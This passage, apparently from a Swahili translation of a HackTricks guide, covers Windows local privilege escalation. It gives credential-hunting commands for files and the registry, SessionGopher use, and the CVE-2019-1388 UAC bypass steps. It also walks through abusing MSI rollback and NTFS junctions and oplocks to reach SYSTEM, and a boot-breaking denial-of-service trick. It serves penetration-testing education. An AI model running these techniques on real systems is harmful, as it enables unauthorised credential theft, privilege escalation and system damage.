![](<../../images/image (729).png>)

Kwa msingi, ikiwa unaweza kuandika upya yoyote ya DLLs itakayotekelezwa, unaweza escalate privileges ikiwa hiyo DLL itatekelezwa na mtumiaji tofauti.

Ili kujifunza jinsi washambuliaji wanavyotumia COM Hijacking kama mbinu ya kudumu angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Tafuta yaliyomo kwenye faili**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili lenye jina fulani**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta rejista kwa majina ya funguo na nywila**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Zana zinazotafuta nywila

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliyetengeneza ili **itekeleze moja kwa moja kila metasploit POST module inayotafuta credentials** ndani ya mlengwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) inatafuta moja kwa moja faili zote zenye nywila zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa nywila kutoka kwenye mfumo.

Zana [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) inatafuta **vikao**, **majina ya watumiaji** na **nywila** za zana kadhaa ambazo zinaohifadhi data hii kwa maandishi wazi (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Fikiria kwamba **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. Mchakato ule ule **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Kisha, ikiwa una **full access to the low privileged process**, unaweza kunyakua **open handle to the privileged process created** with `OpenProcess()` na **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za kumbukumbu zilizoshirikiwa, zinazojulikana kama **pipes**, zinawawezesha mawasiliano ya processes na uhamisho wa data.

Windows inatoa kipengele kinachoitwa **Named Pipes**, kinachoruhusu processes zisizohusiana kushiriki data, hata kwenye mitandao tofauti. Hii inafanana na usanifu wa client/server, ambapo majukumu yameainishwa kama **named pipe server** na **named pipe client**.

Wakati data inapopitishwa kupitia pipe na **client**, **server** iliyoweka pipe ina uwezo wa **take on the identity** ya **client**, ikiwa inayo haki za **SeImpersonate** zinazohitajika. Kutambua **privileged process** inayowasiliana kupitia pipe unaweza kumpatia mgeni fursa ya **gain higher privileges** kwa kuchukua utambulisho wa mchakato huo mara unapoingiliana na pipe uliyoanzisha. Kwa maagizo ya jinsi ya kutekeleza shambulio kama hili, mwongozo muhimu upo [**here**](named-pipe-client-impersonation.md) na [**here**](#from-high-integrity-to-system).

Pia zana zifuatazo zinaweza **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Mengine

### Viambishi vya faili vinavyoweza kutekeleza vitu kwenye Windows

Angalia ukurasa **https://filesec.io/**

### **Kufuatilia mistari ya amri kwa nywila**

Unapopata shell kama mtumiaji, kunaweza kuwa na scheduled tasks au processes nyingine zinazoendeshwa ambazo hupitisha credentials kwenye command line. Script ifuatayo inakamata process command lines kila sekunde mbili na inalinganisha hali ya sasa na ile ya awali, ikitoa tofauti zozote.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kuiba nywila kutoka kwa michakato

## Kutoka Low Priv User hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa una ufikiaji wa kiolesura cha grafiki (kupitia console au RDP) na UAC imewezeshwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na idhini.

Hii inafanya iwezekane kuinua vibali na kupita UAC kwa wakati mmoja kwa kutumia udhaifu uleule. Zaidi ya hayo, hakuna haja ya kusakinisha chochote na binary inayotumika wakati wa mchakato, imewekwa saini na imetolewa na Microsoft.

Baadhi ya mifumo zilizoathiriwa ni zifuatazo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Ili kufanya exploit ya vulnerability hii, ni lazima ufanye hatua zifuatazo:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Kutoka Administrator Medium hadi High Integrity Level / UAC Bypass

Soma hili ili ujifunze kuhusu Integrity Levels:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha soma hili ili ujifunze kuhusu UAC na UAC bypasses:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kutoka Arbitrary Folder Delete/Move/Rename hadi SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Shambulio hili kwa msingi hutegemea kutumia kipengele cha rollback cha Windows Installer kubadilisha mafaili halali kuwa mabaya wakati wa mchakato wa uninstall. Kwa hili mshambuliaji anahitaji kuunda a **malicious MSI installer** ambayo itatumika ku-hijack folda ya `C:\Config.Msi`, ambayo baadaye itatumika na Windows Installer kuhifadhi rollback files wakati wa uninstall ya vifurushi vingine vya MSI ambapo rollback files zingeweza kubadilishwa kuwa na payload mbaya.

Mbinu iliyofupishwa ni ifuatayo:

1. **Stage 1 – Kuandaa kwa Hijack (acha `C:\Config.Msi` tupu)**

- Step 1: Install the MSI
- Unda `.msi` inayosakinisha faili isiyoharibu (mf., `dummy.txt`) katika folda inayoweza kuandikwa (`TARGETDIR`).
- Tambua installer kama **"UAC Compliant"**, ili mtumiaji asiye admin aweze kuikimbia.
- Weka **handle** wazi kwa faili baada ya kusakinisha.

- Step 2: Begin Uninstall
- Uninstall `.msi` hiyo ile.
- Mchakato wa uninstall unaanza kuhamisha mafaili kwenda `C:\Config.Msi` na kuwaita kwa majina yenye `.rbf` (rollback backups).
- **Fanya poll ya handle ya faili iliyo wazi** kwa kutumia `GetFinalPathNameByHandle` ili kugundua wakati faili inakuwa `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- `.msi` ina **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
- Inaonyesha wakati `.rbf` imeandikwa.
- Kisha **inasubiri** tukio lingine kabla ya kuendelea na uninstall.

- Step 4: Block Deletion of `.rbf`
- Wakati inatolewa ishara, **fungua faili `.rbf` bila `FILE_SHARE_DELETE`** — hii **inazuia ifutwe**.
- Kisha **tuma ishara** kurudi ili uninstall iendelee.
- Windows Installer inashindwa kufuta `.rbf`, na kwa sababu hawezi kufuta yaliyomo yote, **`C:\Config.Msi` haifutwi**.

- Step 5: Manually Delete `.rbf`
- Wewe (mshambuliaji) unafuta faili `.rbf` kwa mikono.
- Sasa **`C:\Config.Msi` ni tupu**, tayari kuibiwa.

> Wakati huu, **trigger the SYSTEM-level arbitrary folder delete vulnerability** ili kufuta `C:\Config.Msi`.

2. **Stage 2 – Kubadilisha rollback scripts na zile zenye uovu**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Tengeneza tena folda ya `C:\Config.Msi` wewe mwenyewe.
- Weka **weak DACLs** (mf., Everyone:F), na **hifadhi handle wazi** ukiwa na `WRITE_DAC`.

- Step 7: Run Another Install
- Sakinisha `.msi` tena, ukitumia:
- `TARGETDIR`: Mahali pa kuandika.
- `ERROROUT`: Kigezo kinachosababisha kushindwa kwa lazima.
- Sakinisho hili litatumika kusababisha **rollback** tena, ambayo inasoma `.rbs` na `.rbf`.

- Step 8: Monitor for `.rbs`
- Tumia `ReadDirectoryChangesW` kuangalia `C:\Config.Msi` hadi `.rbs` mpya ionekane.
- Rekodi jina la faili.

- Step 9: Sync Before Rollback
- `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
- Inaonyesha tukio linapotengenezwa `.rbs`.
- Kisha **inasubiri** kabla ya kuendelea.

- Step 10: Reapply Weak ACL
- Baada ya kupokea tukio la `.rbs created`:
- Windows Installer **inatumia tena strong ACLs** kwa `C:\Config.Msi`.
- Lakini kwa kuwa bado una handle mwenye `WRITE_DAC`, unaweza **kureapply weak ACLs** tena.

> ACLs zinatekelezwa **tu wakati handle imefunguliwa**, hivyo bado unaweza kuandika kwenye folda.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Andika juu faili ya `.rbs` na **fake rollback script** inayomwambia Windows:
- Rejesha faili yako ya `.rbf` (malicious DLL) katika **mahali lenye vibali vya juu** (mf., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Weka `.rbf` yako ya uongo ambayo ina **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Tuma ishara ya sync ili installer iendelee.
- Action ya aina ya 19 ya custom (`ErrorOut`) imewekwa kusababisha **kushindwa kwa kusakinisha kwa hiari** katika hatua inayojulikana.
- Hii husababisha **rollback kuanza**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Inasoma `.rbs` yako yenye uovu.
- Inakopa DLL yako ya `.rbf` hadi mahali lengwa.
- Sasa una **malicious DLL katika path inayopakiwa na SYSTEM**.

- Final Step: Execute SYSTEM Code
- Kimbia binary inayotegemewa na yenye auto-elevation (mf., `osk.exe`) ambayo itapakia DLL uliyoihijack.
- **Boom**: Kodi yako inatekelezwa **as SYSTEM**.


### Kutoka Arbitrary File Delete/Move/Rename hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (ile ya awali) inadhani unaweza kufuta **folda nzima** (mf., `C:\Config.Msi`). Lakini je, ikitokea ugumu wako unaruhusu tu **arbitrary file deletion**?

Unaweza kutumia **NTFS internals**: kila folda ina alternate data stream iliyofichwa iitwayo:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Mtiririko huu huhifadhi **metadata ya index** ya folda.

Hivyo, ikiwa **utaifuta mtiririko `::$INDEX_ALLOCATION`** wa folda, NTFS **huondoa folda nzima** kutoka kwenye mfumo wa faili.

Unaweza kufanya hivyo kwa kutumia APIs za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Ingawa unaitisha API ya kufuta *faili*, inafuta **folda yenyewe**.

### Kutoka Folder Contents Delete hadi SYSTEM EoP
Je, nini kama primitive yako haitakuruhusu kufuta faili/folda kiholela, lakini **inaruhusu kufuta *yaliyomo* ya attacker-controlled folder**?

1. Hatua 1: Andaa folda ya mtego na faili
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Hatua 2: Weka **oplock** kwenye `file1.txt`
- Oplock hiyo **inasimamisha utekelezaji** wakati mchakato wenye ruhusa za juu unajaribu kufuta `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Hatua 3: Amsha mchakato wa SYSTEM (mfano, `SilentCleanup`)
- Mchakato huu unapitia folda (mfano, `%TEMP%`) na hujaribu kufuta yaliyomo ndani yake.
- Inapoifikia `file1.txt`, **oplock inaamsha** na inakabidhi udhibiti kwa callback yako.

4. Hatua 4: Ndani ya callback ya oplock – elekeza ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
- Hii inafanya `folder1` kuwa tupu bila kuvunja oplock.
- Usifute `file1.txt` moja kwa moja — hilo litaachilia oplock mapema.

- Chaguo B: Geuza `folder1` kuwa **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Hii inalenga mtiririko wa ndani wa NTFS unaohifadhi metadata ya folda — kuufuta kunafuta folda.

5. Hatua 5: Release the oplock
- Mchakato wa SYSTEM unaendelea na unajaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli inafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka Kuunda Folda ya Nasibu hadi DoS ya Kudumu

Tumia primitive inayokuruhusu **kuunda folda yoyote kama SYSTEM/admin** — hata kama **hutaweza kuandika faili** au **kuweka ruhusa dhaifu**.

Tengeneza **folda** (si faili) lenye jina la **Windows driver muhimu**, kwa mfano:
```
C:\Windows\System32\cng.sys
```
- Njia hii kwa kawaida inalingana na dereva wa kernel-mode `cng.sys`.
- Ikiwa **utaiunda kabla kama folda**, Windows inashindwa kupakia dereva halisi wakati wa boot.
- Kisha, Windows inajaribu kupakia `cng.sys` wakati wa boot.
- Inapoiona folda, **inashindwa kupata dereva halisi**, na **inasababisha crash au kusimamisha boot**.
- Hakuna **njia mbadala**, na **hakuna urejeshaji** bila uingiliaji wa nje (kwa mfano, ukarabati wa boot au upatikanaji wa diski).


## **Kutoka High Integrity hadi System**

### **Huduma mpya**

Ikiwa tayari unafanya kazi kwenye mchakato wa High Integrity, **njia ya kufikia SYSTEM** inaweza kuwa rahisi kwa **kuunda na kutekeleza huduma mpya**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wakati unaunda service binary hakikisha ni service halali au kwamba binary inafanya vitendo vinavyohitajika kwa haraka kwani itauawa ndani ya sekunde 20 ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye mchakato wa High Integrity unaweza kujaribu **kuwezesha AlwaysInstallElevated registry entries** na **kufunga** reverse shell kwa kutumia wrapper ya _**.msi**_.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata msimbo hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ikiwa una vibali hivyo vya token (labda utavipata ndani ya mchakato ambao tayari ni wa High Integrity), utaweza **kufungua karibu mchakato wowote** (si mchakato uliolindwa) kwa kutumia ruhusa ya SeDebug, **kunakili token** ya mchakato, na kuunda **mchakato yeyote ule kwa kutumia token hiyo**.\
Kwa kawaida watu hutumia mbinu hii kwa **kuchagua mchakato unaoendesha kama SYSTEM uliyonayo vibali vyote vya token** (_ndio, unaweza kupata mchakato za SYSTEM bila vibali vyote vya token_).\
**Unaweza kupata** [**mfano wa msimbo unatekeleza mbinu hii hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii inatumiwa na meterpreter kupanda hadhi katika `getsystem`. Mbinu hiyo inajumuisha **kuunda pipe kisha kuunda/kunyanyasa service ili kuandika kwenye pipe hiyo**. Kisha, **server** aliyeuunda pipe kwa kutumia ruhusa ya **`SeImpersonate`** ataweza **kujifanya token** ya mteja wa pipe (service) na kupata ruhusa za SYSTEM.\
Ikiwa unataka [**kujifunza zaidi kuhusu named pipes soma hii**](#named-pipe-client-impersonation).\
Ikiwa unataka kusoma mfano wa [**jinsi ya kutoka high integrity kwenda System kwa kutumia named pipes soma hii**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ikiwa utafanikiwa **hijack a dll** inayopakiwa na **mchakato** unaoendesha kama **SYSTEM** utaweza kutekeleza msimbo wa hiari kwa vibali hivyo. Kwa hiyo Dll Hijacking pia ni muhimu kwa aina hii ya kuongezeka kwa vibali, na, zaidi ya hayo, ni **rahisi zaidi kufikiwa kutoka kwenye mchakato wa High Integrity** kwani utakuwa na **write permissions** kwenye folda zinazotumika kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Chombo bora kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Angalia misconfigurations na faili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imetambuliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Angalia baadhi ya misconfigurations inayowezekana na kukusanya taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Angalia misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za vikao vilivyohifadhiwa vya PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwa lokal.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa nenosiri kutoka Credential Manager. Imetambuliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spraya nywila zilizokusanywa katika domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer na chombo cha man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Uorodheshaji wa msingi wa privesc Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~\**\~\~ -- Tafuta mianya inayojulikana ya privesc (DEPRECATED kwa Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa lokal **(Inahitaji haki za Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Tafuta mianya ya privesc inayojulikana (inahitaji kuundwa kwa VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Orodhesha host ikitafuta misconfigurations (zuri zaidi kama chombo cha kukusanya taarifa kuliko privesc) (inahitaji kuundwa) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa nywila kutoka kwa programu nyingi (exe iliyotayarishwa awali kwenye github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwa C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~\**\~\~ -- Angalia misconfiguration (executable precompiled kwenye github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Angalia misconfigurations inayowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Chombo kilichotengenezwa kwa msingi wa chapisho hili (hakihitaji accesschk ili kifanye kazi vizuri lakini kinaweza kukitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma output ya **systeminfo** na kupendekeza exploits zinazoenda kazi (python lokal)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma output ya **systeminfo** na kupendekeza exploits zinazoenda kazi (python lokal)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Lazima ucompile project ukitumia toleo sahihi la .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye mwenyeji unaweza kufanya:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Marejeo

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) na kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Kumfuata Silver Fox: Paka & Panya katika Vivuli vya Kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
